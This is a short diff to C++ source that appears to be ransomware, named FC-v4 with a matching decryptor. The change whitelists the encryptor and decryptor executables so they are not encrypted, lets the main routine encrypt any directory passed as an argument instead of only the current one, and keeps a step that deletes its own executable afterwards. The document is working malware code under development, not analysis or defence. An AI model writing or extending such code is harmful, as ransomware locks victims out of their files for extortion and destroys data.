@@ -14,7 +14,7 @@ const int BUFFER_SIZE = 4096;
 
 bool isFileWhitelisted(const std::string& fileName)
 {
-    const std::vector<std::string> whitelist_files = {"./important.txt"};
+    const std::vector<std::string> whitelist_files = {"./FC-v4.exe", "./FC-v4_DECRYPTOR.exe"};
 
     if (std::find(whitelist_files.begin(), whitelist_files.end(), fileName) != whitelist_files.end()) {
         return true;
@@ -112,10 +112,13 @@ void encryptDirectory(const std::string& dirName)
     }
 }
 
-int main()
+int main(int argv, char *argc[])
 {
-    encryptDirectory(".");
-
+    if (argv < 2){
+        encryptDirectory(".");
+    }else {
+        encryptDirectory(argc[1]);
+    }
     if (unlink("FC4") != 0) {
         if (unlink("./FC4.exe") != 0) {
             std::cerr << "Error deleting file: FC4" << std::endl;
